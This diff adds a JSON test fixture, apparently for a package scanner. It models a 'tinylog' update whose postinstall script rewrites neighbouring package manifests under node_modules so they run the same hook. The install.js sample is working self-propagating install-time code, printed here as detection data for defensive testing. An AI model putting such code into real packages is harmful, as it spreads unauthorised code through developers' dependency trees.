@@ -1,0 +1,55 @@
+{
+  "id": "install-hook-node-modules-write",
+  "title": "Postinstall hook writes install hooks into neighbouring packages",
+  "category": "install-time-self-propagation",
+  "intent": "Model local propagation: install-time code rewrites the manifests under node_modules so packages the consumer already trusts gain the same hook. Inert fixture; the write target is a fixture path, not a real tree.",
+  "previousPackageJson": {
+    "name": "tinylog",
+    "version": "1.4.2"
+  },
+  "stagedPackageJson": {
+    "name": "tinylog",
+    "version": "1.4.3",
+    "scripts": {
+      "postinstall": "node install.js"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 36,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinylog\",\"version\":\"1.4.2\"}"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 80,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinylog\",\"version\":\"1.4.3\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+    },
+    {
+      "path": "install.js",
+      "size": 481,
+      "sha256": "install-js",
+      "flags": [],
+      "textSample": "const fs = require('node:fs');\nconst path = require('node:path');\n// Add our hook to every package already unpacked beside us.\nconst root = path.join(process.cwd(), '..', 'node_modules');\nfor (const name of fs.readdirSync(root)) {\n  const manifest = path.join(root, name, 'package.json');\n  const pkg = JSON.parse(fs.readFileSync(manifest, 'utf8'));\n  pkg.scripts = { ...pkg.scripts, preinstall: 'node ../tinylog/install.js' };\n  fs.writeFileSync(manifest, JSON.stringify(pkg));\n}\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "install-script.lifecycle",
+      "severity": "high",
+      "file": "package.json"
+    },
+    {
+      "ruleId": "propagation.package-mutation",
+      "severity": "high",
+      "file": "install.js"
+    }
+  ]
+}
